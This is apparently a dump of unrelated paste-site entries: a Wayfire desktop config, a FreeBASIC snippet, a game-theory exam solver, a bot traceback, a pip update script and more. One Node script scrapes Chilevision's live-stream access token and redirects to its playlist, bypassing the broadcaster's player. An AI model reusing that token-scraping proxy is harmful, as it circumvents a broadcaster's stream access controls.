# Note: [blur] is not enabled by default, because it can be resource-intensive.
# Feel free to add it to the list if you want it.
# You can find its documentation here:
# https://github.com/WayfireWM/wayfire/wiki/Configuration#blur

# Close focused window.
close_top_view = <super> KEY_Q | <alt> KEY_F4

# Workspaces arranged into a grid: 3 √ó 3.
vwidth = 2
vheight = 2

# Prefer client-side decoration or server-side decoration
preferred_decoration_mode = client

# Mouse bindings ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Drag windows by holding down Super and left mouse button.
[move]
activate = <super> BTN_LEFT

# Resize them with right mouse button + Super.
[resize]
activate = <super> BTN_RIGHT

# Zoom in the desktop by scrolling + Super.
[zoom]
modifier = <super>

# Change opacity by scrolling with Super + Alt.
[alpha]
modifier = <super> <alt>

# Rotate windows with the mouse.
[wrot]
activate = <super> <ctrl> BTN_RIGHT

# Fisheye effect.
[fisheye]
toggle = <super> <ctrl> KEY_F

# Startup commands ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

[autostart]

0_0 = dbus-update-activation-environment --systemd WAYLAND_DISPLAY XDG_CURRENT_DESKTOP=Wayfire
0_1 = systemctl --user import-environment WAYLAND_DISPLAY XDG_CURRENT_DESKTOP

# Automatically start background and panel.
# Set to false if you want to override the default clients.
autostart_wf_shell = true
launcher01 = brave-beta
launcher02 = nautilus
launcher03 = gnome-text-editor
launcher04 = gnome-system-monitor
# launcher05 = epiphany
# launcher06 = flatpak run org.gnome.Prompt.Devel
# launcher06 = xfce4-terminal
launcher07 = ironbar
launcher08 = flatpak run org.gnome.Ptyxis.Devel

# background = wf-background
# panel = wf-panel
# dock = wf-dock

# Output configuration
# https://wayland.emersion.fr/kanshi/
outputs = kanshi

# Notifications
# https://wayland.emersion.fr/mako/
notifications = mako

# Screen color temperature
# https://sr.ht/~kennylevinsen/wlsunset/
gamma = wlsunset

# Idle configuration
# https://github.com/swaywm/swayidle
# https://github.com/swaywm/swaylock
# idle = swayidle before-sleep swaylock

# XDG desktop portal
# Needed by some GTK applications
portal = /usr/libexec/xdg-desktop-portal

# Example configuration:
#
# [idle]
toggle = <super> KEY_Z
screensaver_timeout = 120
# dpms_timeout = 600
#
# Disables the compositor going idle with Super + z.
# This will lock your screen after 300 seconds of inactivity, then turn off
# your displays after another 300 seconds.

# Applications ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

[command]

# Start a terminal
# https://github.com/alacritty/alacritty
binding_terminal = <super> KEY_ENTER
command_terminal = xfce4-terminal

# Start your launcher
# https://hg.sr.ht/~scoopta/wofi
# Note: Add mode=run or mode=drun to ~/.config/wofi/config.
# You can also specify the mode with --show option.
binding_launcher = <super> <shift> KEY_ENTER
command_launcher = wofi

# Screen locker
# https://github.com/swaywm/swaylock
binding_lock = <super> <shift> KEY_ESC
command_lock = swaylock

# Logout
# https://github.com/ArtsyMacaw/wlogout
binding_logout = <super> KEY_ESC
command_logout = wlogout

# Screenshots
# https://wayland.emersion.fr/grim/
# https://wayland.emersion.fr/slurp/
binding_screenshot = KEY_PRINT
command_screenshot = grim $(date '+%F_%T').webp
binding_screenshot_interactive = <shift> KEY_PRINT
command_screenshot_interactive = slurp | grim -g - $(date '+%F_%T').webp

# Volume controls
# https://alsa-project.org
repeatable_binding_volume_up = KEY_VOLUMEUP
command_volume_up = amixer set Master 5%+
repeatable_binding_volume_down = KEY_VOLUMEDOWN
command_volume_down = amixer set Master 5%-
binding_mute = KEY_MUTE
command_mute = amixer set Master toggle

# Screen brightness
# https://haikarainen.github.io/light/
repeatable_binding_light_up = KEY_BRIGHTNESSUP
command_light_up = light -A 5
repeatable_binding_light_down = KEY_BRIGHTNESSDOWN
command_light_down = light -U 5

# Windows ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Actions related to window management functionalities.
#
# Example configuration:
#
# [wm-actions]
# toggle_fullscreen = <super> KEY_F
# toggle_always_on_top = <super> KEY_X
# toggle_sticky = <super> <shift> KEY_X

# Position the windows in certain regions of the output.
[grid]
#
# ‚á± ‚Üë ‚á≤   ‚îÇ 7 8 9
# ‚Üê f ‚Üí   ‚îÇ 4 5 6
# ‚á± ‚Üì ‚á≤ d ‚îÇ 1 2 3 0
# ‚Äæ   ‚Äæ
slot_bl = <super> KEY_KP1
slot_b = <super> KEY_KP2
slot_br = <super> KEY_KP3
slot_l = <super> KEY_LEFT | <super> KEY_KP4
slot_c = <super> KEY_UP | <super> KEY_KP5
slot_r = <super> KEY_RIGHT | <super> KEY_KP6
slot_tl = <super> KEY_KP7
slot_t = <super> KEY_KP8
slot_tr = <super> KEY_KP9
# Restore default.
restore = <super> KEY_DOWN | <super> KEY_KP0

# Change active window with an animation.
[switcher]
next_view = <alt> KEY_TAB
prev_view = <alt> <shift> KEY_TAB

# Simple active window switcher.
[fast-switcher]
activate = <alt> KEY_ESC

# Workspaces ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Switch to workspace.
[vswitch]
binding_left = <ctrl> <super> KEY_LEFT
binding_down = <ctrl> <super> KEY_DOWN
binding_up = <ctrl> <super> KEY_UP
binding_right = <ctrl> <super> KEY_RIGHT
# Move the focused window with the same key-bindings, but add Shift.
with_win_left = <ctrl> <super> <shift> KEY_LEFT
with_win_down = <ctrl> <super> <shift> KEY_DOWN
with_win_up = <ctrl> <super> <shift> KEY_UP
with_win_right = <ctrl> <super> <shift> KEY_RIGHT

# Show the current workspace row as a cube.
[cube]
activate = <ctrl> <alt> BTN_LEFT
# Switch to the next or previous workspace.
#rotate_lefte = <super> <ctrl> KEY_H
#rotate_right = <super> <ctrl> KEY_L

# Show an overview of all workspaces.
[expo]
toggle = <super> KEY_E | hotspot left-top 10x10 200e
# Select a workspace.
# Workspaces are arranged into a grid of 3 √ó 3.
# The numbering is left to right, line by line.
#
# ‚á± k ‚á≤
# h ‚èé l
# ‚á± j ‚á≤
# ‚Äæ   ‚Äæ
# See core.vwidth and core.vheight for configuring the grid.
select_workspace_1 = KEY_1
select_workspace_2 = KEY_2
select_workspace_3 = KEY_3
select_workspace_4 = KEY_4
select_workspace_5 = KEY_5
select_workspace_6 = KEY_6
select_workspace_7 = KEY_7
select_workspace_8 = KEY_8
select_workspace_9 = KEY_9

# Outputs ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Change focused output.
[oswitch]
# Switch to the next output.
next_output = <super> KEY_O
# Same with the window.
next_output_with_win = <super> <shift> KEY_O

# Invert the colors of the whole output.
[invert]
toggle = <super> KEY_I

# Send toggle menu event.
[wayfire-shell]
toggle_menu = <super>


[window-rules]

rule_001 = on created if app_id is ""org.gnome.Nautilus"" then move 270 100
rule_002 = on created if app_id is ""org.gnome.Nautilus"" then assign_workspace 0 0

rule_003 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then move 1400 400
rule_004 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then assign_workspace 0 0
rule_004 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then set alpha 0.9

rule_005 = on created if app_id is ""brave-browser-beta"" then assign_workspace 1 0

rule_006 = on created if app_id is ""org.gnome.Epiphany"" then assign_workspace 1 0

rule_007 = on created if app_id is ""gnome-system-monitor"" then assign_workspace 0 1

rule_008 = on created if app_id is ""org.gnome.TextEditor"" then assign_workspace 1 1

rule_003 = on created if app_id is ""org.gnome.Console"" then move 700 500
rule_004 = on created if app_id is ""org.gnome.Console"" then assign_workspace 0 0

rule_003 = on created if app_id is ""xfce4-terminal"" then move 1400 400
rule_004 = on created if app_id is ""xfce4-terminal"" then assign_workspace 0 0

"
bk3T0c5C,CHILEVISION,sagan11,JSON,Saturday 16th of March 2024 02:25:38 PM CDT,"const axios = require('axios');
const Monitor = require('ping-monitor');
const express = require('express');
const url = require('url');
const app = express();

const monitor = new Monitor({
    website: 'https://chv-m3u.chorroaeboy.repl.co',
    title: 'status',
    interval: 5 // minutes
});

monitor.on('up', res => console.log(`${res.website} est√° encedido.`));
monitor.on('down', res => console.log(`${res.website} se ha ca√≠do - ${res.statusMessage}`));
monitor.on('stop', website => console.log(`${website} se ha parado.`) );
monitor.on('error', error => console.log(error));


app.get('/', function(req, res) {
  res.setHeader('Content-Type', 'application/x-mpegURL');
  axios.get('https://www.chilevision.cl/ms_player_src_01/live/1560140104.js')
.then(response => {
    const respuesta = response.data.split(';');
    const token = respuesta[0].replace(/'/g, """").replace('// Se√±al Online\nvar token = ', '');
    id = respuesta[1].replace(/\n/g, """").replace(/'/g, """").replace('var id = ', '');
    res.redirect(`https://mdstrm.com/live-stream-playlist-v/${id}.m3u8?access_token=${token}`);
  })
})
app.listen(""8080"");"
XGgTcj8M,Pastes.io [Pastebin Alternative],xxsa,PHP,Saturday 16th of March 2024 02:09:29 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
rjQyitkP,Untitled,Mysoft,FreeBasic,Saturday 16th of March 2024 02:09:07 PM CDT,"#include ""crt.bi""

#define StringPointer(_S) cptr(any ptr ptr,@_S)[0]
#define StringLength(_S)  cptr(integer ptr,@_S)[1]

dim as ubyte n(7) = {asc(""H""),asc(""e""),asc(""l""),asc(""l""),asc(""o"")}
print *cptr(zstring ptr,@n(0))
printf(!""%s\n"",@n(0))

'---- string header manip ----
dim as string sTemp
StringPointer(sTemp) = @n(0)
StringLength(sTemp) = 4
print sTemp 'just 'hell' :)

sleep

"
8rEdfiLM,19 —Å —É—Å–ª–æ–≤–∏–µ–º –Ω–∞ –¥–µ–ª–∏–º–æ—Å—Ç—å –Ω–∞ 3,nq1s788,Python,Saturday 16th of March 2024 02:05:04 PM CDT,"from functools import lru_cache


def moves(h):
    a = h
    answ = []
    if (a + 1) % 3 != 0:
        answ.append(a + 1)
    if (a + 2) % 3 != 0:
        answ.append(a + 2)
    if (a * 2) % 3 != 0:
        answ.append(a * 2)
    return answ


@lru_cache(None)
def game (h):
    if h >= 151:
        return 'win'
    elif any(game(m) == 'win' for m in moves(h)):
        return'p1'
    elif all (game(m) == 'p1' for m in moves(h)):
        return'v1'
    elif any(game(m) == 'v1' for m in moves(h)):
        return'p2'
    elif all(game(m) in ['p1', 'p2'] for m in moves(h)):
        return'v2'


def p19(h):
    return any(game(m) == 'p1' for m in moves(h))


print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'v1'])
print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'p2'])
print([s for s in range(1, 150) if (s % 3 != 0) and game(s) == 'v2'])"
hz32MrG8,boostanull,manekta,Python,Saturday 16th of March 2024 02:02:27 PM CDT,"caxapboost:035E02D8-04D3-05FD-4B06-4F0700080009
"
i9jn0cS5,Swimbot Error,swimmerhair,Python,Saturday 16th of March 2024 01:53:24 PM CDT,"Traceback (most recent call last):
  File ""/home/pi/.local/lib/python3.9/site-packages/discord/ext/commands/core.py"", line 85, in wrapped
    ret = await coro(*args, **kwargs)
  File ""/home/pi/Swimbot/cc.py"", line 265, in k
    player.set_thumbnail(url=th_list[int(townhall[10:])])
IndexError: list index out of range
"
qe2XCeP1,update_all_packages,Python253,Python,Saturday 16th of March 2024 01:49:12 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: update_all_packages.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
A Python script to update all installed packages to their latest versions,
excluding those installed in editable mode.

This script utilizes the 'pip' package manager to update all packages installed in the Python environment 
to their latest available versions. It filters out packages installed in editable mode ('-e' flag), 
typically used for development purposes, as these should not be updated automatically.

Requirements:
    - Python (2.7 or later) must be installed on your system.
    - 'pip' package manager must be available in your PATH.

Usage:
    1. Ensure Python and 'pip' are installed and accessible from your command line.
    2. Save this script as 'update_packages.py' in a directory of your choice.
    3. Open a command prompt or terminal window.
    4. Navigate to the directory where 'update_packages.py' is located.
    5. Run the script by executing the following command:
       
       $ python update_packages.py

    6. The script will list all installed packages and their versions, 
       excluding those installed in editable mode. It will then proceed to update 
       each package to its latest available version, displaying the updated packages 
       as it progresses.

Note: It's recommended to review the changes made by the script to ensure 
      compatibility with your projects, as updating packages may introduce 
      breaking changes or unexpected behavior.
""""""

import subprocess
import re

def update_packages():
    # List installed packages
    try:
        output = subprocess.check_output(['pip', 'freeze', '--local'], universal_newlines=True)
        installed_packages = output.split('\n')
    except subprocess.CalledProcessError as e:
        print(""Error:"", e)
        return

    # Filter out editable packages
    filtered_packages = [pkg for pkg in installed_packages if not pkg.startswith('-e')]

    # Extract package names
    package_names = [re.split(r'==|\s+', pkg)[0] for pkg in filtered_packages if pkg]

    # Update packages
    for package in package_names:
        try:
            subprocess.check_call(['pip', 'install', '-U', package])
            print(f""Successfully updated {package}"")
        except subprocess.CalledProcessError as e:
            print(f""Error updating {package}: {e}"")

if __name__ == ""__main__"":
    update_packages()

"
